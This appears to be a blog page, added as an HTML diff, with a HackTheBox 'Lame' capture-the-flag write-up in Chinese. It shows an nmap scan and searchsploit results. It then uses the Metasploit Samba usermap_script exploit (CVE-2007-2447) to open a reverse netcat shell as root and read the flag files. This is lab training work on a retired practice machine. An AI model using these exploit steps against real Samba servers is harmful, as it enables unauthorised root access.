@@ -1,0 +1,629 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HackTheBox - Lame - Yueyejian’s Blog</title>
+<meta name="description" content="HackTheBox - Lame About Lame Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.">
+
+
+  <meta name="author" content="yueyejian">
+  
+  <meta property="article:author" content="yueyejian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Yueyejian's Blog">
+<meta property="og:title" content="HackTheBox - Lame">
+<meta property="og:url" content="http://localhost:4000/hack-the-box/lame/">
+
+
+  <meta property="og:description" content="HackTheBox - Lame About Lame Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2023-04-22T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/hack-the-box/lame/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "yueyejian",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Yueyejian's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://yueyejian13.github.io">
+        <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://yueyejian13.github.io" itemprop="url">yueyejian</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere in China.</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://yueyejian13.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">首页</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/yueyejian13" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://paypal.me/yueyejian?country.x=C2&locale.x=zh_XC" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox - Lame">
+    <meta itemprop="description" content="HackTheBox - LameAbout LameLame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.">
+    <meta itemprop="datePublished" content="2023-04-22T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox - Lame
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-04-22T00:00:00+08:00">April 22, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          11 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#hackthebox---lame">HackTheBox - Lame</a><ul><li><a href="#about-lame">About Lame</a></li><li><a href="#nmap">Nmap</a></li><li><a href="#msf">MSF</a></li><li><a href="#cve-2007-2447">CVE-2007-2447</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="hackthebox---lame">HackTheBox - Lame</h1>
+<h2 id="about-lame">About Lame</h2>
+<p>Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.</p>
+
+<p><img src="/images/hackthebox/lame/0.png" alt="" /></p>
+
+<h2 id="nmap">Nmap</h2>
+<p>扫一下端口</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/lame]
+└─$ cat nmap.txt
+# Nmap 7.93 scan initiated Sat Apr 22 00:01:10 2023 as: nmap -n -v -sC -sV -oN nmap.txt -Pn 10.10.10.3
+Nmap scan report for 10.10.10.3
+Host is up (0.55s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT    STATE SERVICE      VERSION
+21/tcp  open  ftp          vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.4
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
+|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
+139/tcp open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  microsoft-ds Samba smbd 3.0.20-Debian
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h00m22s, deviation: 2h49m45s, median: 20s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2023-04-22T00:05:32-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Apr 22 00:05:54 2023 -- 1 IP address (1 host up) scanned in 284.48 seconds                                                                                                                                                   
+</code></pre></div></div>
+<h2 id="msf">MSF</h2>
+<p>查询相关漏洞，发现第三行的<code class="language-plaintext highlighter-rouge">'Username map script' Command Execution (Metasploit)</code>可用，而且是metasploit里面的攻击模块</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/lame]
+└─$ searchsploit samba 3.0
+------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                           |  Path
+------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                     | osx/remote/16875.rb
+Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                                                   | multiple/remote/10095.txt
+Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                         | unix/remote/16320.rb
+Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                       | linux/remote/9950.rb
+Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                   | linux/remote/16859.rb
+Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                 | solaris/remote/16329.rb
+Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                 | linux/dos/4732.c
+Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                        | multiple/dos/5712.pl
+Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                         | linux/remote/364.pl
+Samba &lt; 3.0.20 - Remote Heap Overflow                                                                                    | linux/remote/7701.txt
+Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                            | linux_x86/dos/36741.py
+------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</code></pre></div></div>
+
+<p>直接用metasploit搜索<code class="language-plaintext highlighter-rouge">Samba 3.0.20</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; search samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No    
+</code></pre></div></div>
+<p>选择此模块并配置好反弹shell的相关参数，用<code class="language-plaintext highlighter-rouge">run</code>命令发起攻击，直接获取了root权限下的shell，直接打开root下的flag</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; use 0
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) &gt; show option
+[-] Invalid parameter "option", use "show -h" for more information
+msf6 exploit(multi/samba/usermap_script) &gt; show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.32.134   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3
+rhost =&gt; 10.10.10.3
+msf6 exploit(multi/samba/usermap_script) &gt; set rport 445
+rport =&gt; 445
+msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.14.4
+lhost =&gt; 10.10.14.4
+msf6 exploit(multi/samba/usermap_script) &gt; set lport 2333
+lport =&gt; 2333
+msf6 exploit(multi/samba/usermap_script) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.4:2333 
+[*] Command shell session 1 opened (10.10.14.4:2333 -&gt; 10.10.10.3:40919) at 2023-04-22 00:22:42 -0400
+whoami
+root
+which python
+/usr/bin/python
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@lame:/# cat /root/root.txt
+cat /root/root.txt
+162190c25286540dea9c0047e......
+</code></pre></div></div>
+<p>user下的flag</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lame:/home# find / -name user.txt 2&gt;/dev/null
+find / -name user.txt 2&gt;/dev/null
+/home/makis/user.txt
+root@lame:/home# cat /makis/user.txt
+cat /makis/user.txt
+cat: /makis/user.txt: No such file or directory
+root@lame:/home# cat makis/user.txt
+cat makis/user.txt
+a5ceb51f1741b774fbee61a559......
+</code></pre></div></div>
+<h2 id="cve-2007-2447">CVE-2007-2447</h2>
+<p>用show info查看模块信息，可以看到漏洞编号是CVE-2007-2447</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit(multi/samba/usermap_script) &gt; show info
+
+       Name: Samba "username map script" Command Execution
+     Module: exploit/multi/samba/usermap_script
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2007-05-14
+
+Provided by:
+  jduck &lt;jduck@metasploit.com&gt;
+
+Available targets:
+      Id  Name
+      --  ----
+  =&gt;  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS  10.10.10.3       yes       The target host(s), see https://docs.
+                                     metasploit.com/docs/using-metasploit/
+                                     basics/using-metasploit.html
+  RPORT   445              yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+
+Description:
+  This module exploits a command execution vulnerability in Samba 
+  versions 3.0.20 through 3.0.25rc3 when using the non-default 
+  "username map script" configuration option. By specifying a username 
+  containing shell meta characters, attackers can execute arbitrary 
+  commands. No authentication is needed to exploit this vulnerability 
+  since this option is used to map usernames prior to authentication!
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
+  OSVDB (34700)
+  http://www.securityfocus.com/bid/23972
+  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
+  http://samba.org/samba/security/CVE-2007-2447.html
+
+
+View the full module info with the info -d command.
+
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      <a href="/tags/#msf" class="page__taxonomy-item" rel="tag">msf</a><span class="sep">, </span>
+    
+      <a href="/tags/#samba" class="page__taxonomy-item" rel="tag">samba</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">hack-the-box</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-04-22T00:00:00+08:00">April 22, 2023</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/hack-the-box/holiday/" class="pagination--pager" title="HackTheBox - Holiday
+">Previous</a>
+    
+    
+      <a href="/hack-the-box/brainfuck/" class="pagination--pager" title="HackTheBox - Brainfuck
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+  </ul>
+</div>
+
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
